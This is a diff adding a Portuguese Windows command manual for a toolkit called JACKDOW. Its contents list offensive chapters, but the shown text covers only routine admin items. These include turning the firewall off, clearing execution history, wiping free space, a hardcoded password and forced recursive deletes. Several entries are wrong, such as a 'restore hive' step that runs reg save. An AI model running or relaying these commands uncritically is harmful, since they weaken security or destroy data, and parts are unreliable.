@@ -1,0 +1,2176 @@
+JACKDOW - MANUAL COMPLETO (WINDOWS)
+=====================================
+
+SUMÁRIO
+-------
+1.  Introdução
+2.  Funcionalidades Básicas (1-4)
+3.  Gerenciamento do Sistema (5)
+4.  Desempenho (6)
+5.  Atualizações (7)
+6.  Rede Básica (8)
+7.  Arquivos e Discos (9)
+8.  Processos e Serviços (10)
+9.  Utilitários Avançados (11)
+10. Segurança e Permissões (12)
+11. Backup e Restauração (13)
+12. Registro (14)
+13. Energia (15)
+14. Diagnósticos (16)
+15. Rede Avançada (17)
+16. Otimização (18)
+17. Usuários (19)
+18. Diversos (20)
+19. Segurança e Antimalware (21)
+20. Reparo do Sistema (22)
+21. Análise de Disco (23)
+22. Otimização Automática (24)
+23. Registro Avançado (25)
+24. Monitoramento de Rede (26)
+25. Serviços Avançado (27)
+26. Logs e Auditoria (28)
+27. Drivers e Hardware (29)
+28. Usuários Avançado (30)
+29. Backup Avançado (31)
+30. Relatórios (32)
+31. Limpeza Avançada (33)
+32. Interface (34)
+33. Hacking e Pentest (35)
+34. Esteganografia (36)
+35. Engenharia Reversa (37)
+36. Automação Maliciosa (38)
+37. Keylogging (39)
+38. Persistência (40)
+39. Anti-Forense (41)
+40. Exploits (42)
+41. Criptografia Forçada (43)
+42. Redes Anônimas (44)
+43. Injeção de Processos (45)
+44. Bypass de Segurança (46)
+45. Coleta de Intelligence (47)
+46. Manipulação de Memória (48)
+47. Ataques de Rede (49)
+
+=====================================================================
+
+1. INTRODUÇÃO
+=============
+JACKDOW é um toolkit de terminal ultra-completo para Windows, com mais de 350 funcionalidades organizadas em 49 categorias. Projetado para administradores de sistemas, profissionais de segurança, entusiastas e curiosos, oferece desde tarefas simples de manutenção até técnicas avançadas de hacking ético e exploração.
+
+Compatibilidade: Windows 98 até Windows 11
+Dependências: Zero (usa apenas comandos nativos do CMD e PowerShell)
+Tamanho: ~200KB
+Execução: Instantânea
+
+=====================================================================
+
+2. FUNCIONALIDADES BÁSICAS (1-4)
+================================
+
+Opção 1 - Limpar tela
+----------------------
+Comando: cls
+Descrição: Limpa a tela do terminal para melhor visualização.
+
+Opção 2 - Info sistema
+----------------------
+Comando: systeminfo | findstr ...
+Descrição: Exibe informações essenciais do sistema:
+- Nome do host
+- Versão do SO
+- Arquitetura
+- Memória RAM total e disponível
+- Processador
+- Versão da BIOS
+- Localidade
+
+Opção 3 - Ping
+--------------
+Comando: ping %host%
+Descrição: Testa conectividade com um host ou IP (4 pacotes padrão).
+Uso: Digite o endereço (ex: google.com, 8.8.8.8)
+
+Opção 4 - Limpar temporários
+-----------------------------
+Comandos: 
+- del /f /s /q "%TEMP%"
+- rd /s /q "%TEMP%"
+- md "%TEMP%"
+- del /f /s /q "C:\Windows\Temp"
+- rd /s /q "C:\Windows\Temp"
+- md "C:\Windows\Temp"
+Descrição: Remove todos os arquivos temporários do usuário e do sistema, recriando as pastas vazias. Libera espaço em disco.
+
+=====================================================================
+
+3. GERENCIAMENTO DO SISTEMA (5)
+================================
+
+5.1. Desativar hibernação
+--------------------------
+Comando: powercfg /h off
+Descrição: Desliga o recurso de hibernação, liberando o espaço em disco equivalente à quantidade de RAM instalada.
+
+5.2. Verificar arquivos sistema (sfc)
+--------------------------------------
+Comando: sfc /scannow
+Descrição: Verifica e repara arquivos protegidos do sistema. Pode exigir reinicialização.
+
+5.3. Info BIOS
+--------------
+Comando: wmic bios get manufacturer,name,serialnumber,version
+Descrição: Exibe fabricante, nome, número de série e versão da BIOS.
+
+5.4. Usuário atual info
+------------------------
+Comando: whoami /all
+Descrição: Mostra informações detalhadas do usuário logado, incluindo SID, grupos, privilégios.
+
+5.5. Variáveis de ambiente
+---------------------------
+Comando: set
+Descrição: Lista todas as variáveis de ambiente do sistema e do usuário.
+
+5.6. Drivers instalados
+------------------------
+Comando: driverquery /v /fo list
+Descrição: Lista detalhada de todos os drivers instalados, incluindo versão, fabricante, estado.
+
+5.7. Informações DirectX
+-------------------------
+Comando: dxdiag /t dxdiag.txt & type dxdiag.txt & del dxdiag.txt
+Descrição: Gera relatório DirectX com informações de placa de vídeo, som, dispositivos.
+
+5.8. Versão do .NET Framework
+------------------------------
+Comando: reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s /v Version
+Descrição: Verifica as versões do .NET Framework instaladas.
+
+5.9. Ativar/Desativar firewall
+-------------------------------
+Comando: netsh advfirewall set allprofiles state off
+Descrição: Alterna o estado do firewall do Windows (desliga todas as profiles).
+
+=====================================================================
+
+4. DESEMPENHO (6)
+==================
+
+6.1. Diagnóstico energia
+-------------------------
+Comando: powercfg /energy
+Descrição: Gera relatório HTML detalhado sobre eficiência energética em %USERPROFILE%\energy-report.html.
+
+6.2. Esquema Ultimate Performance
+----------------------------------
+Comando: powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61
+Descrição: Adiciona o esquema de energia "Ultimate Performance" (disponível apenas em algumas edições do Windows).
+
+6.3. Parar rastreamentos
+-------------------------
+Comando: wpr -cancel
+Descrição: Interrompe rastreamentos de desempenho em execução.
+
+6.4. Processos por CPU
+-----------------------
+Comando: powershell "Get-Process | Sort-Object CPU -Descending | Select -First 20 Name,CPU"
+Descrição: Lista os 20 processos que mais consomem CPU.
+
+6.5. Processos por memória
+---------------------------
+Comando: powershell "Get-Process | Sort-Object WorkingSet -Descending | Select -First 20 Name,WorkingSet"
+Descrição: Lista os 20 processos que mais consomem RAM.
+
+6.6. Performance counters
+--------------------------
+Comando: typeperf -q
+Descrição: Lista todos os contadores de performance disponíveis.
+
+6.7. Velocidade do sistema
+---------------------------
+Comando: wmic cpu get name,maxclockspeed,currentclockspeed
+Descrição: Mostra nome, clock máximo e clock atual do processador.
+
+6.8. Tempo de inicialização
+----------------------------
+Comando: systeminfo | findstr "Tempo"
+Descrição: Exibe há quanto tempo o sistema está ligado (uptime).
+
+6.9. Uso de disco
+------------------
+Comando: typeperf "\LogicalDisk(_Total)\% Disk Time" -sc 5
+Descrição: Monitora o percentual de uso do disco em 5 amostras.
+
+=====================================================================
+
+5. ATUALIZAÇÕES (7)
+====================
+
+7.1. Winget atualizar todos
+----------------------------
+Comando: winget upgrade --all
+Descrição: Atualiza todos os pacotes instalados via Windows Package Manager. Se não disponível, exibe mensagem.
+
+7.2. Chocolatey atualizar
+--------------------------
+Comando: choco upgrade all
+Descrição: Atualiza todos os pacotes instalados via Chocolatey. Se não disponível, exibe mensagem.
+
+7.3. Updates instalados
+------------------------
+Comando: powershell "Get-HotFix | Sort-Object InstalledOn -Descending | Select -First 30"
+Descrição: Lista os últimos 30 hotfixes/atualizações instalados.
+
+7.4. Verificar atualizações Windows
+------------------------------------
+Comando: wuauclt /showoptions
+Descrição: Abre a interface do Windows Update para verificar atualizações.
+
+7.5. Histórico de atualizações
+-------------------------------
+Comando: wmic qfe list brief /format:texttable
+Descrição: Exibe todo o histórico de atualizações instaladas.
+
+7.6. Windows Update agente
+---------------------------
+Comando: wuauclt /detectnow
+Descrição: Força o agente do Windows Update a verificar atualizações.
+
+7.7. Microsoft Store apps
+--------------------------
+Comando: powershell "Get-AppxPackage | Select Name,PackageFullName"
+Descrição: Lista todos os aplicativos instalados da Microsoft Store.
+
+7.8. Limpar cache Windows Update
+---------------------------------
+Comandos:
+- net stop wuauserv
+- rd /s /q C:\Windows\SoftwareDistribution
+- net start wuauserv
+Descrição: Para o serviço de update, remove o cache e reinicia. Libera espaço.
+
+=====================================================================
+
+6. REDE BÁSICA (8)
+===================
+
+8.1. Configuração IP completa
+------------------------------
+Comando: ipconfig /all
+Descrição: Mostra toda configuração de rede: IP, máscara, gateway, DNS, DHCP, MAC.
+
+8.2. Redes Wi-Fi salvas
+------------------------
+Comando: netsh wlan show profiles
+Descrição: Lista todas as redes Wi-Fi com perfil salvo no computador.
+
+8.3. Ping contínuo
+-------------------
+Comando: ping -t %host%
+Descrição: Executa ping infinito até interrupção manual (Ctrl+C).
+
+8.4. Tracert 8.8.8.8
+---------------------
+Comando: tracert 8.8.8.8
+Descrição: Rastreia a rota até o servidor DNS do Google.
+
+8.5. Winsock reset
+-------------------
+Comando: netsh winsock reset
+Descrição: Reseta o catálogo Winsock (problemas de rede). Requer reinicialização.
+
+8.6. Conexões ativas
+---------------------
+Comando: netstat -ano | findstr ESTABLISHED
+Descrição: Mostra conexões TCP estabelecidas com PID.
+
+8.7. Teste porta google
+------------------------
+Comando: powershell Test-NetConnection google.com -Port 80
+Descrição: Testa conectividade na porta 80 com google.com.
+
+8.8. Liberar/Renovar IP
+------------------------
+Comandos: ipconfig /release & ipconfig /renew
+Descrição: Libera e renova o endereço IP obtido via DHCP.
+
+8.9. Cache DNS
+---------------
+Comando: ipconfig /displaydns
+Descrição: Exibe o cache DNS atual.
+
+=====================================================================
+
+7. ARQUIVOS E DISCOS (9)
+=========================
+
+9.1. Limpar todos .tmp
+-----------------------
+Comando: del /S /Q *.tmp *.log *.bak
+Descrição: Remove recursivamente arquivos .tmp, .log e .bak do diretório atual.
+
+9.2. Árvore diretórios
+-----------------------
+Comando: tree /F /A
+Descrição: Gera árvore gráfica de diretórios com arquivos.
+
+9.3. Verificar disco C:
+------------------------
+Comando: chkdsk /f /r C:
+Descrição: Verifica e repara erros no disco C:. Pode exigir agendamento para reboot.
+
+9.4. Desfragmentar C:
+----------------------
+Comando: defrag C: /U /V
+Descrição: Desfragmenta o disco C: com relatório detalhado.
+
+9.5. Criar arquivo teste
+-------------------------
+Comando: fsutil file createnew %nome% 1073741824
+Descrição: Cria um arquivo de 1GB com o nome especificado.
+
+9.6. Tamanho total arquivos
+----------------------------
+Comando: cd \ & powershell "Get-ChildItem -Recurse | Measure-Object -Property Length -Sum"
+Descrição: Calcula o espaço total usado por arquivos na raiz C:\.
+
+9.7. Compactar arquivos
+------------------------
+Comando: compact /c %arquivo%
+Descrição: Compacta o arquivo especificado (NTFS compression).
+
+9.8. Backup diferencial
+------------------------
+Comando: robocopy %origem% %dest% /MIR /NP /LOG:backup.log
+Descrição: Sincroniza pastas com mirror (cópia exata) e gera log.
+
+9.9. Permissões arquivo
+------------------------
+Comando: cacls %arquivo%
+Descrição: Mostra as permissões do arquivo/pasta.
+
+9.10. Ocultar arquivo
+----------------------
+Comando: attrib +h %arquivo%
+Descrição: Aplica o atributo oculto ao arquivo.
+
+=====================================================================
+
+8. PROCESSOS E SERVIÇOS (10)
+==============================
+
+10.1. Lista processos detalhada
+--------------------------------
+Comando: wmic process get name,processid,commandline,workingsetsize /format:list
+Descrição: Lista processos com nome, PID, linha de comando e memória.
+
+10.2. Fechar processo
+----------------------
+Comando: taskkill /IM %nome% /F
+Descrição: Força o encerramento do processo pelo nome.
+
+10.3. Serviços ativos
+----------------------
+Comando: net start
+Descrição: Lista todos os serviços em execução.
+
+10.4. Conexões TCP ativas
+--------------------------
+Comando: powershell Get-NetTCPConnection -State Established
+Descrição: Mostra conexões TCP estabelecidas com detalhes.
+
+10.5. Processos por PID
+------------------------
+Comando: wmic process get processid,name,commandline
+Descrição: Lista processos ordenados por PID.
+
+10.6. Prioridade processo
+--------------------------
+Comando: wmic process where processid=%pid% set priority=32
+Descrição: Altera a prioridade do processo (32 = Realtime).
+
+10.7. Serviços parados
+-----------------------
+Comando: sc query state= inactive
+Descrição: Lista serviços que não estão em execução.
+
+10.8. Iniciar/Parar serviço
+----------------------------
+Comando: net start/stop %servico%
+Descrição: Inicia ou para um serviço específico.
+
+10.9. Lista DLLs processo
+--------------------------
+Comando: listdlls %pid% (Sysinternals)
+Descrição: Lista DLLs carregadas por um processo (requer Sysinternals).
+
+=====================================================================
+
+9. UTILITÁRIOS AVANÇADOS (11)
+===============================
+
+11.1. Reiniciar PC
+-------------------
+Comando: shutdown /r /t 0
+Descrição: Reinicia o computador imediatamente.
+
+11.2. Desligar PC
+------------------
+Comando: shutdown /s /t 0
+Descrição: Desliga o computador imediatamente.
+
+11.3. Sobrescrever espaço livre
+--------------------------------
+Comando: cipher /w:C
+Descrição: Sobrescreve espaço livre no disco C: com dados aleatórios (anti-recuperação).
+
+11.4. Log atualizações
+-----------------------
+Comando: wevtutil epl System system.evtx
+Descrição: Exporta o log do sistema para arquivo .evtx.
+
+11.5. Cópia avançada robocopy
+------------------------------
+Comando: robocopy %origem% %dest% /E /COPY:DAT /R:3 /W:10 /LOG:robocopy.log
+Descrição: Cópia avançada com retentativas e log.
+
+11.6. Agendador tarefas
+------------------------
+Comando: taskschd.msc
+Descrição: Abre o Agendador de Tarefas do Windows.
+
+11.7. Eventos sistema
+----------------------
+Comando: eventvwr.msc
+Descrição: Abre o Visualizador de Eventos.
+
+11.8. Configuração sistema
+---------------------------
+Comando: msconfig
+Descrição: Abre a Configuração do Sistema.
+
+11.9. Informações hardware
+---------------------------
+Comando: msinfo32
+Descrição: Abre o Informações do Sistema.
+
+=====================================================================
+
+10. SEGURANÇA E PERMISSÕES (12)
+================================
+
+12.1. Verificar integridade
+----------------------------
+Comando: sfc /scannow
+Descrição: Verifica e repara arquivos do sistema.
+
+12.2. Escanear malware
+-----------------------
+Comando: mrt
+Descrição: Abre a Ferramenta de Remoção de Software Malicioso (MRT).
+
+12.3. Políticas de segurança
+-----------------------------
+Comando: secpol.msc
+Descrição: Abre a Política de Segurança Local.
+
+12.4. Usuários e grupos
+------------------------
+Comando: lusrmgr.msc
+Descrição: Abre o Gerenciamento de Usuários e Grupos Locais.
+
+12.5. Permissões arquivos
+--------------------------
+Comando: cacls %arquivo%
+Descrição: Exibe permissões do arquivo.
+
+12.6. Auditoria ativada
+------------------------
+Comando: auditpol /get /category:*
+Descrição: Mostra políticas de auditoria atuais.
+
+12.7. Firewall regras
+----------------------
+Comando: netsh advfirewall firewall show rule all
+Descrição: Lista todas as regras do firewall.
+
+12.8. Criptografia arquivo
+---------------------------
+Comando: cipher /e %arquivo%
+Descrição: Criptografa o arquivo (EFS).
+
+12.9. Certificados
+-------------------
+Comando: certlm.msc
+Descrição: Abre o gerenciador de certificados do computador local.
+
+=====================================================================
+
+11. BACKUP E RESTAURAÇÃO (13)
+==============================
+
+13.1. Backup registro
+----------------------
+Comando: regedit /e backup.reg
+Descrição: Exporta todo o registro para backup.reg.
+
+13.2. Restaurar registro
+-------------------------
+Comando: regedit /i restaura.reg
+Descrição: Importa arquivo .reg para o registro.
+
+13.3. Backup arquivos
+----------------------
+Comando: robocopy %origem% %dest% /MIR /R:2 /W:5 /LOG:backup.log
+Descrição: Backup mirror com retentativas.
+
+13.4. Restaurar arquivos
+-------------------------
+Comando: robocopy %origem% %dest% /E
+Descrição: Restaura arquivos de backup.
+
+13.5. Ponto restauração
+------------------------
+Comando: wmic syscreate restorepoint
+Descrição: Cria um ponto de restauração do sistema.
+
+13.6. Backup estado sistema
+----------------------------
+Comando: wbadmin start backup -backupTarget:C: -include:C: -allCritical -quiet
+Descrição: Backup completo do estado do sistema (requer privilégios).
+
+13.7. Backup drivers
+---------------------
+Comando: dism /online /export-driver /destination:C:\DriversBackup
+Descrição: Exporta todos os drivers instalados.
+
+13.8. Backup certificados
+--------------------------
+Comando: certutil -exportPFX -p senha123
+Descrição: Exporta certificados (exemplo com senha fixa).
+
+=====================================================================
+
+12. REGISTRO (14)
+==================
+
+14.1. Exportar registro
+------------------------
+Comando: regedit /e backup_completo.reg
+Descrição: Exporta todo o registro.
+
+14.2. Importar registro
+------------------------
+Comando: regedit /i %arquivo%
+Descrição: Importa arquivo .reg.
+
+14.3. Verificar registro
+-------------------------
+Comando: chkdsk /f & sfc /scannow
+Descrição: Verificação combinada de disco e sistema.
+
+14.4. Limpar registro
+----------------------
+Comando: reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Desnecessario
+Descrição: Remove entrada específica (CUIDADO: manual recomendado).
+
+14.5. Backup hives
+-------------------
+Comando: reg save HKLM\System system.hiv & reg save HKLM\Software software.hiv
+Descrição: Salva hives do sistema em arquivos.
+
+14.6. Restaurar hive
+---------------------
+Comando: reg save HKLM\Software software.hiv
+Descrição: Restaura hive (requer restauração manual).
+
+14.7. Permissões chave
+-----------------------
+Comando: reg query "%chave%" /reg:32
+Descrição: Consulta chave específica do registro.
+
+=====================================================================
+
+13. ENERGIA (15)
+=================
+
+15.1. Planos energia
+---------------------
+Comando: powercfg /list
+Descrição: Lista todos os planos de energia disponíveis.
+
+15.2. Criar plano
+------------------
+Comando: powercfg -duplicatescheme 381b4222-f694-41f0-9685-ff5bb260df2e
+Descrição: Duplica o plano de energia existente.
+
+15.3. Suspender PC
+-------------------
+Comando: rundll32.exe powrprof.dll,SetSuspendState 0,1,0
+Descrição: Suspende o computador (standby).
+
+15.4. Hibernar
+---------------
+Comando: powercfg /h on & shutdown /h
+Descrição: Ativa hibernação e hiberna o PC.
+
+15.5. Configurar botão
+-----------------------
+Comando: powercfg /setacvalueindex scheme_current sub_buttons lidaction 0
+Descrição: Configura ação do botão de energia.
+
+15.6. Relatório energia
+------------------------
+Comando: powercfg /energy
+Descrição: Gera relatório diagnóstico de energia.
+
+15.7. Suspensão seletiva
+-------------------------
+Comando: powercfg /availablesleepstates
+Descrição: Mostra estados de suspensão disponíveis.
+
+15.8. Desligar monitor
+-----------------------
+Comando: powercfg /change monitor-timeout-ac 5
+Descrição: Configura monitor para desligar após 5 minutos.
+
+=====================================================================
+
+14. DIAGNÓSTICOS (16)
+======================
+
+16.1. Memória RAM teste
+------------------------
+Comando: mdsched
+Descrição: Abre a ferramenta de diagnóstico de memória (requer reboot).
+
+16.2. Disco teste
+------------------
+Comando: wmic diskdrive get status
+Descrição: Verifica status dos discos (OK, Pred Fail, etc).
+
+16.3. Rede diagnóstico
+-----------------------
+Comando: netsh diag ping google.com
+Descrição: Testa conectividade com diagnóstico.
+
+16.4. Performance monitor
+--------------------------
+Comando: perfmon
+Descrição: Abre o Monitor de Desempenho.
+
+16.5. Driver verifier
+----------------------
+Comando: verifier
+Descrição: Abre o Verificador de Driver (teste de estresse).
+
+16.6. DirectX diagnóstico
+--------------------------
+Comando: dxdiag /t dxdiag.txt & type dxdiag.txt
+Descrição: Gera relatório DirectX e exibe.
+
+16.7. Sistema arquivos
+-----------------------
+Comando: chkdsk /f /r C:
+Descrição: Verifica sistema de arquivos.
+
+16.8. Relatório saúde
+----------------------
+Comando: perfmon /report
+Descrição: Gera relatório de saúde do sistema.
+
+16.9. Logs sistema
+-------------------
+Comando: wevtutil qe System /c:50 /f:text
+Descrição: Exibe últimos 50 eventos do sistema.
+
+=====================================================================
+
+15. REDE AVANÇADA (17)
+=======================
+
+17.1. Estatísticas rede
+------------------------
+Comando: netstat -e -s
+Descrição: Estatísticas detalhadas de rede por protocolo.
+
+17.2. Rotas
+------------
+Comando: route print
+Descrição: Tabela de roteamento.
+
+17.3. ARP table
+----------------
+Comando: arp -a
+Descrição: Cache ARP (endereços MAC).
+
+17.4. NetBIOS cache
+--------------------
+Comando: nbtstat -c
+Descrição: Cache NetBIOS.
+
+17.5. Portas abertas
+---------------------
+Comando: netstat -an | findstr LISTENING
+Descrição: Portas em listening.
+
+17.6. Conexões remotas
+-----------------------
+Comando: net view
+Descrição: Computadores visíveis na rede.
+
+17.7. QoS política
+-------------------
+Comando: gpresult /r
+Descrição: Resultado de políticas de grupo (incluindo QoS).
+
+17.8. Bridge redes
+-------------------
+Comando: netsh bridge show adapter
+Descrição: Configuração de bridge de rede.
+
+17.9. VPN conexões
+-------------------
+Comando: rasdial /?
+Descrição: Comandos disponíveis para VPN.
+
+=====================================================================
+
+16. OTIMIZAÇÃO (18)
+====================
+
+18.1. Limpeza disco
+--------------------
+Comando: cleanmgr /sagerun:1
+Descrição: Executa limpeza de disco com configurações salvas.
+
+18.2. Desfragmentar todos
+--------------------------
+Comando: defrag C: /O
+Descrição: Otimiza todos os discos (desfragmentação + TRIM).
+
+18.3. Otimizar inicialização
+-----------------------------
+Comando: msconfig
+Descrição: Abre configuração de inicialização.
+
+18.4. Serviços desnecessários
+------------------------------
+Comando: sc query state= all | findstr "SERVICE_NAME"
+Descrição: Lista serviços para análise manual.
+
+18.5. Efeitos visuais
+----------------------
+Comando: SystemPropertiesPerformance
+Descrição: Abre configurações de desempenho visual.
+
+18.6. Paginação arquivo
+------------------------
+Comando: wmic computersystem set AutomaticManagedPagefile=False
+Descrição: Configura arquivo de paginação manual.
+
+18.7. Prefetch e Superfetch
+----------------------------
+Comando: sc config SysMain start= disabled
+Descrição: Desativa o serviço Superfetch/SysMain.
+
+18.8. Desativar programas
+--------------------------
+Comando: msconfig
+Descrição: Gerenciar programas de inicialização.
+
+18.9. SSD otimização
+---------------------
+Comando: fsutil behavior query DisableDeleteNotify
+Descrição: Verifica status do TRIM.
+
+=====================================================================
+
+17. USUÁRIOS (19)
+==================
+
+19.1. Lista usuários
+---------------------
+Comando: net user
+Descrição: Lista todos os usuários locais.
+
+19.2. Criar usuário
+--------------------
+Comando: net user %novo% * /add
+Descrição: Cria novo usuário (senha será solicitada).
+
+19.3. Alterar senha
+--------------------
+Comando: net user %username% *
+Descrição: Altera senha do usuário atual.
+
+19.4. Grupos usuários
+----------------------
+Comando: net localgroup
+Descrição: Lista grupos locais.
+
+19.5. Permissões usuário
+-------------------------
+Comando: net user %user%
+Descrição: Detalhes do usuário específico.
+
+19.6. Logon atual
+------------------
+Comando: whoami
+Descrição: Usuário atual.
+
+19.7. Sessões abertas
+----------------------
+Comando: query user
+Descrição: Sessões de usuário ativas.
+
+19.8. Política senhas
+----------------------
+Comando: net accounts
+Descrição: Configurações de política de senhas.
+
+19.9. Bloquear usuário
+-----------------------
+Comando: net user %username% /active:no
+Descrição: Desativa conta de usuário.
+
+=====================================================================
+
+18. DIVERSOS (20)
+==================
+
+20.1. Data e hora
+------------------
+Comando: time & date
+Descrição: Exibe/ajusta data e hora.
+
+20.2. Calculadora
+------------------
+Comando: calc
+Descrição: Abre a calculadora.
+
+20.3. Bloco de notas
+---------------------
+Comando: notepad
+Descrição: Abre o bloco de notas.
+
+20.4. Paint
+------------
+Comando: mspaint
+Descrição: Abre o Paint.
+
+20.5. Explorador arquivos
+--------------------------
+Comando: explorer
+Descrição: Abre o Explorador de Arquivos.
+
+20.6. Prompt comando
+---------------------
+Comando: start cmd
+Descrição: Abre nova janela do CMD.
+
+20.7. PowerShell
+-----------------
+Comando: start powershell
+Descrição: Abre nova janela do PowerShell.
+
+20.8. Gerenciador tarefas
+--------------------------
+Comando: taskmgr
+Descrição: Abre o Gerenciador de Tarefas.
+
+20.9. Painel controle
+----------------------
+Comando: control
+Descrição: Abre o Painel de Controle.
+
+=====================================================================
+
+19. SEGURANÇA E ANTIMALWARE (21)
+=================================
+
+21.1. Scanner rápido Defender
+------------------------------
+Comando: mrt
+Descrição: Ferramenta de Remoção de Software Malicioso (scan rápido).
+
+21.2. Scan completo Defender
+-----------------------------
+Comando: start "" "ms-settings:windowsdefender"
+Descrição: Abre interface do Windows Defender.
+
+21.3. Status Windows Defender
+------------------------------
+Comando: powershell "Get-MpComputerStatus"
+Descrição: Exibe status completo do Defender (proteção, atualizações).
+
+21.4. Atualizar definições
+---------------------------
+Comando: "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -SignatureUpdate
+Descrição: Força atualização das definições do Defender.
+
+21.5. Histórico de ameaças
+---------------------------
+Comando: powershell "Get-MpThreatDetection"
+Descrição: Mostra histórico de ameaças detectadas.
+
+21.6. Verificar processos suspeitos
+------------------------------------
+Comando: powershell "Get-Process | Where-Object {$_.Company -eq $null -and $_.Name -notlike '*svchost*'} | Select Name,CPU,Company"
+Descrição: Lista processos sem empresa/assinatura.
+
+21.7. Detectar malware por nome
+--------------------------------
+Comando: tasklist | findstr /i "%malware%"
+Descrição: Busca processo por nome suspeito.
+
+21.8. Escanear USB
+-------------------
+Comando: start "" "%ProgramFiles%\Windows Defender\MSASCui.exe"
+Descrição: Abre Defender para escanear USB.
+
+=====================================================================
+
+20. REPARO DO SISTEMA (22)
+===========================
+
+22.1. Verificar imagem DISM
+----------------------------
+Comando: dism /online /cleanup-image /checkhealth
+Descrição: Verifica corrupção na imagem do sistema.
+
+22.2. Reparar imagem DISM
+--------------------------
+Comando: dism /online /cleanup-image /restorehealth
+Descrição: Repara imagem do sistema usando Windows Update.
+
+22.3. Resetar Windows Update
+-----------------------------
+Comandos:
+- net stop wuauserv & net stop cryptSvc & net stop bits & net stop msiserver
+- ren C:\Windows\SoftwareDistribution SoftwareDistribution.old
+- ren C:\Windows\System32\catroot2 Catroot2.old
+- net start wuauserv & net start cryptSvc & net start bits & net start msiserver
+- wuauclt /resetauthorization /detectnow
+Descrição: Reseta completamente o Windows Update.
+
+22.4. Reparar componentes
+--------------------------
+Comando: sfc /scannow & dism /online /cleanup-image /restorehealth
+Descrição: Repara componentes corrompidos (sfc + dism).
+
+22.5. Resetar loja apps
+------------------------
+Comando: wsreset.exe
+Descrição: Reseta o cache da Microsoft Store.
+
+22.6. Reparar .NET Framework
+-----------------------------
+Comando: dism /online /cleanup-image /restorehealth & sfc /scannow
+Descrição: Repara .NET Framework via DISM.
+
+22.7. Resetar política grupo
+-----------------------------
+Comando: gpupdate /force
+Descrição: Atualiza políticas de grupo.
+
+22.8. Reparar DLLs sistema
+---------------------------
+Comando: regsvr32 /s actxprxy.dll & regsvr32 /s shdocvw.dll
+Descrição: Re-registra DLLs importantes.
+
+=====================================================================
+
+21. ANÁLISE DE DISCO (23)
+==========================
+
+23.1. Uso de disco por pasta
+-----------------------------
+Comando: powershell "Get-ChildItem '%pasta%' -Recurse | Group-Object Directory | Select Name,@{Name='Tamanho(MB)';Expression={[math]::Round((($_.Group | Measure-Object Length -Sum).Sum)/1MB,2)}} | Sort 'Tamanho(MB)' -Descending"
+Descrição: Analisa espaço usado por cada subpasta.
+
+23.2. Top 10 maiores arquivos
+------------------------------
+Comando: powershell "Get-ChildItem -Recurse -File -ErrorAction SilentlyContinue | Sort-Object Length -Descending | Select -First 10 Name,Length"
+Descrição: Lista os 10 maiores arquivos.
+
+23.3. Arquivos duplicados
+--------------------------
+Comando: powershell "Get-ChildItem -Recurse -File -ErrorAction SilentlyContinue | Group-Object Length,Name | Where-Object {$_.Count -gt 1} | Select -ExpandProperty Group"
+Descrição: Encontra arquivos duplicados por nome e tamanho.
+
+23.4. Pastas vazias
+--------------------
+Comando: for /r %pasta% /d %%i in (.) do dir /a /b "%%i" 2>nul | findstr "^" >nul || echo %%i
+Descrição: Lista pastas vazias recursivamente.
+
+23.5. Arquivos antigos
+-----------------------
+Comando: forfiles /p %pasta% /s /m * /d -365 /c "cmd /c echo @file"
+Descrição: Arquivos com mais de 1 ano.
+
+23.6. Extensões mais usadas
+----------------------------
+Comando: powershell "Get-ChildItem -Recurse -File | Group-Object Extension | Sort-Object Count -Descending | Select -First 20"
+Descrição: Estatística por extensão de arquivo.
+
+23.7. Arquivos ocultos
+-----------------------
+Comando: attrib /s /d | find "H"
+Descrição: Lista arquivos ocultos.
+
+23.8. Permissões problemáticas
+-------------------------------
+Comando: powershell "Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {!(Get-Acl $_.FullName -ErrorAction SilentlyContinue).Access}"
+Descrição: Pastas com permissões potencialmente problemáticas.
+
+=====================================================================
+
+22. OTIMIZAÇÃO AUTOMÁTICA (24)
+================================
+
+24.1. Otimização um clique
+---------------------------
+Comandos:
+- del /f /s /q "%TEMP%" 2>nul
+- del /f /s /q C:\Windows\Temp 2>nul
+- del /f /s /q C:\Windows\Prefetch 2>nul
+- cleanmgr /sagerun:1
+- defrag C: /O
+Descrição: Limpeza completa + desfragmentação em um único comando.
+
+24.2. Desativar efeitos visuais
+--------------------------------
+Comando: SystemPropertiesPerformance
+Descrição: Abre configurações de efeitos visuais.
+
+24.3. Ajustar paginação
+------------------------
+Comando: wmic computersystem set AutomaticManagedPagefile=True
+Descrição: Restaura gerenciamento automático da memória virtual.
+
+24.4. Limpar prefetch
+----------------------
+Comando: del /f /s /q C:\Windows\Prefetch\* & sc stop SysMain & sc config SysMain start= disabled
+Descrição: Limpa prefetch e desativa Superfetch.
+
+24.5. Desfragmentar registro
+-----------------------------
+Comando: reg export HKLM C:\regback.reg /y & reg export HKCU C:\regback2.reg /y & reg import C:\regback.reg
+Descrição: Exporta e reimporta o registro (compactação).
+
+24.6. Acelerar inicialização
+-----------------------------
+Comando: msconfig
+Descrição: Abre configuração de inicialização.
+
+24.7. Otimizar SSD
+-------------------
+Comando: fsutil behavior query DisableDeleteNotify
+Descrição: Verifica TRIM.
+
+24.8. Ajustar serviços
+-----------------------
+Comando: sc config DiagTrack start= disabled & sc config dmwappushservice start= disabled & sc config RemoteRegistry start= disabled
+Descrição: Desativa serviços desnecessários.
+
+=====================================================================
+
+23. REGISTRO AVANÇADO (25)
+===========================
+
+25.1. Backup registro completo
+-------------------------------
+Comandos:
+- reg export HKLM C:\RegBackup\HKLM.reg
+- reg export HKCU C:\RegBackup\HKCU.reg
+- reg export HKCR C:\RegBackup\HKCR.reg
+- reg export HKU C:\RegBackup\HKU.reg
+Descrição: Backup completo de todas as hives.
+
+25.2. Exportar chaves específicas
+----------------------------------
+Comando: reg export "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" run.reg
+Descrição: Exporta chaves de inicialização.
+
+25.3. Limpar RunMRU
+--------------------
+Comando: reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
+Descrição: Remove histórico de executados.
+
+25.4. Verificar entradas inválidas
+-----------------------------------
+Comando: reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s | findstr /i "C:\\"
+Descrição: Verifica se caminhos existem.
+
+25.5. Restaurar backup
+-----------------------
+Comando: reg import %arquivo%
